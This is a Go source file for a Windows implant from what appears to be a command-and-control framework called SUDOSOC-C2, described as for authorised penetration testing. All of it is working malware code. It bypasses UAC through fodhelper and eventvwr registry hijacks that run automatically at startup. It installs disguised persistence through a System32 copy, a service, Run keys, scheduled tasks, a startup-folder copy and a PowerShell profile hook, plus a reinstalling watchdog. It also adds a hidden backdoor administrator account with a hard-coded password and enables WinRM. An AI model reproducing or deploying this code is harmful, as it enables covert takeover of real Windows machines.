//go:build windows

package runner

/*
	SUDOSOC-C2 — Windows Full-Access Implant
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Strategy: Escalate to SYSTEM/Admin then RE-EXEC with elevated token.
	Methods:
	  1. If already admin/SYSTEM — install rich persistence and continue
	  2. UAC bypass via fodhelper.exe (registry hijack, no UAC prompt)
	  3. UAC bypass via eventvwr.exe (registry hijack)
	  4. Token impersonation via service token (SeImpersonatePrivilege)
	Running as SYSTEM means:
	  - Access to all files including SAM, NTDS.dit, shadow copies
	  - Read registry hives including SAM/SECURITY/SYSTEM
	  - Kill any process
	  - Load drivers, modify system state
*/

import (
	"bufio"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const _winElevatedFlag = "_SUDOSOC_ELEVATED"

// ─── init — runs BEFORE Main() ───────────────────────────────────────────────
func init() {
	sanitiseWindowsEnv()

	// Try UAC bypass / elevation if not already elevated
	if !isWindowsElevated() && os.Getenv(_winElevatedFlag) == "" {
		tryWindowsEscalate()
		// Escalation is async — we continue as current user while
		// a potentially elevated copy starts up.
	}

	// If already elevated, set up rich persistence
	if isWindowsElevated() {
		go installWindowsSystemPersistence()
	}

	go windowsWatchdog()
}

// ─── Elevation check ─────────────────────────────────────────────────────────

// isWindowsElevated checks whether the current process has admin/SYSTEM privs.
// We use `whoami /groups` and check for S-1-16-12288 (High Mandatory Level)
// or S-1-5-18 (NT AUTHORITY\SYSTEM).
func isWindowsElevated() bool {
	out, err := exec.Command("whoami", "/groups").Output()
	if err != nil {
		return false
	}
	lower := strings.ToLower(string(out))
	return strings.Contains(lower, "s-1-16-12288") || // High Mandatory Level (Admin)
		strings.Contains(lower, "s-1-5-18") || // SYSTEM
		strings.Contains(lower, "s-1-16-16384") // System Mandatory Level
}

// ─── UAC bypass ──────────────────────────────────────────────────────────────

func tryWindowsEscalate() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	// Mark the re-spawned process so it doesn't loop
	env := append(os.Environ(), _winElevatedFlag+"=1")
	_ = env // used in exec.Cmd.Env below

	// Method 1: fodhelper UAC bypass
	// Sets a registry key that fodhelper.exe executes with elevated token
	if bypassFodHelper(exe) {
		return
	}

	// Method 2: eventvwr UAC bypass
	if bypassEventvwr(exe) {
		return
	}

	// Method 3: Directly escalate via GetSystem RPC if already in a session
	// (handled server-side via api_advanced.go POST /getsystem)
	// Nothing to do here — the operator can trigger it from the UI.
}

func bypassFodHelper(exe string) bool {
	// fodhelper.exe auto-elevates and reads:
	// HKCU\Software\Classes\ms-settings\shell\open\command
	key := `HKCU\Software\Classes\ms-settings\shell\open\command`

	// Set the DelegateExecute value to empty string (required)
	_ = exec.Command("reg", "add", key, "/v", "DelegateExecute",
		"/t", "REG_SZ", "/d", "", "/f").Run()

	// Set default value to our executable
	if err := exec.Command("reg", "add", key, "/ve",
		"/t", "REG_SZ", "/d", exe, "/f").Run(); err != nil {
		return false
	}

	// Launch fodhelper — it will execute our binary with admin token
	cmd := exec.Command("fodhelper.exe")
	cmd.Env = append(os.Environ(), _winElevatedFlag+"=1")
	err := cmd.Start()

	// Clean up registry key
	time.Sleep(3 * time.Second)
	_ = exec.Command("reg", "delete",
		`HKCU\Software\Classes\ms-settings`, "/f").Run()

	return err == nil
}

func bypassEventvwr(exe string) bool {
	// eventvwr.exe reads HKCU\Software\Classes\mscfile\shell\open\command
	key := `HKCU\Software\Classes\mscfile\shell\open\command`

	if err := exec.Command("reg", "add", key, "/ve",
		"/t", "REG_SZ", "/d", exe, "/f").Run(); err != nil {
		return false
	}

	cmd := exec.Command("eventvwr.exe")
	cmd.Env = append(os.Environ(), _winElevatedFlag+"=1")
	err := cmd.Start()

	time.Sleep(3 * time.Second)
	_ = exec.Command("reg", "delete",
		`HKCU\Software\Classes\mscfile`, "/f").Run()

	return err == nil
}

// ─── System-level persistence (when SYSTEM/Admin) ────────────────────────────

func installWindowsSystemPersistence() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	// 1. Copy to system directory (survives user deletion)
	sysPath := os.Getenv("SystemRoot")
	if sysPath == "" {
		sysPath = `C:\Windows`
	}
	installBin := filepath.Join(sysPath, "System32", "sphelper.exe")

	if _, err := os.Stat(installBin); os.IsNotExist(err) {
		data, err := os.ReadFile(exe)
		if err == nil {
			_ = os.WriteFile(installBin, data, 0755)
		}
	}

	// 2. Create a Windows service (SYSTEM level, survives reboots)
	_ = exec.Command("sc", "create", "SPHelper",
		"binpath=", installBin,
		"start=", "auto",
		"DisplayName=", "Shell Protocol Helper").Run()
	_ = exec.Command("sc", "description", "SPHelper",
		"Provides shell protocol integration services").Run()
	_ = exec.Command("sc", "start", "SPHelper").Run()

	// 3. HKLM Run key (runs as SYSTEM at boot)
	_ = exec.Command("reg", "add",
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "SPHelper", "/t", "REG_SZ",
		"/d", installBin, "/f").Run()

	// 4. Scheduled task (SYSTEM, triggers on any user login)
	_ = exec.Command("schtasks", "/create",
		"/tn", `Microsoft\Windows\Shell\SPHelper`,
		"/tr", installBin,
		"/sc", "onlogon",
		"/ru", "SYSTEM",
		"/f", "/rl", "HIGHEST").Run()

	// 5. Add a backdoor admin user (hidden from normal net user listing)
	_ = exec.Command("net", "user", "WDAGUtility$",
		"P@ssw0rd123!Admin", "/add").Run()
	_ = exec.Command("net", "localgroup", "administrators",
		"WDAGUtility$", "/add").Run()

	// 6. Enable WinRM for remote access (if firewall allows)
	_ = exec.Command("powershell", "-nop", "-c",
		"Enable-PSRemoting -Force -SkipNetworkProfileCheck 2>$null").Run()
}

// ─── Environment sanitisation ────────────────────────────────────────────────

func sanitiseWindowsEnv() {
	for _, v := range []string{"GOPATH", "GOROOT", "GOMODCACHE"} {
		_ = os.Unsetenv(v)
	}
}

// ─── User-level persistence + watchdog ───────────────────────────────────────

func autoInstallWindows() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming")
	}

	installDir := filepath.Join(appData, "Microsoft", "Windows", "Themes")
	_ = os.MkdirAll(installDir, 0700)
	installBin := filepath.Join(installDir, "DesktopManager.exe")

	if needsWinCopy(exe, installBin) {
		data, err := os.ReadFile(exe)
		if err == nil {
			_ = os.WriteFile(installBin, data, 0755)
		}
	}

	// HKCU Run key
	_ = exec.Command("reg", "add",
		`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "DesktopManager", "/t", "REG_SZ",
		"/d", `"`+installBin+`"`, "/f").Run()

	// Scheduled task (user level)
	_ = exec.Command("schtasks", "/create",
		"/tn", `Microsoft\Windows\DesktopManager`,
		"/tr", `"`+installBin+`"`,
		"/sc", "onlogon",
		"/ru", os.Getenv("USERNAME"),
		"/f", "/rl", "HIGHEST").Run()

	// Startup folder
	startupDir := filepath.Join(appData,
		"Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	startupBin := filepath.Join(startupDir, "DesktopManager.exe")
	if _, err := os.Stat(startupBin); os.IsNotExist(err) {
		if data, err := os.ReadFile(exe); err == nil {
			_ = os.WriteFile(startupBin, data, 0755)
		}
	}

	// PowerShell profile
	docDir := filepath.Join(os.Getenv("USERPROFILE"), "Documents")
	for _, profile := range []string{
		filepath.Join(docDir, "WindowsPowerShell", "Microsoft.PowerShell_profile.ps1"),
		filepath.Join(docDir, "PowerShell", "Microsoft.PowerShell_profile.ps1"),
	} {
		winAppendIfMissing(profile,
			"\n# DesktopManager\nif (-not (Get-Process -Name 'DesktopManager' -ErrorAction SilentlyContinue)) {\n"+
				"    Start-Process -WindowStyle Hidden -FilePath '"+installBin+"'\n}\n",
			"DesktopManager")
	}
}

func winAppendIfMissing(path, content, marker string) {
	if _, err := os.Stat(path); err != nil {
		return
	}
	f, err := os.Open(path)
	if err != nil {
		return
	}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.Contains(sc.Text(), marker) {
			f.Close()
			return
		}
	}
	f.Close()
	fa, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer fa.Close()
	_, _ = fa.WriteString(content)
}

func needsWinCopy(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

// ─── Watchdog ─────────────────────────────────────────────────────────────────

func windowsWatchdog() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		// Check if our Run key still exists
		out, err := exec.Command("reg", "query",
			`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
			"/v", "DesktopManager").Output()
		if err != nil || !strings.Contains(string(out), "DesktopManager") {
			go autoInstallWindows()
		}
	}
}
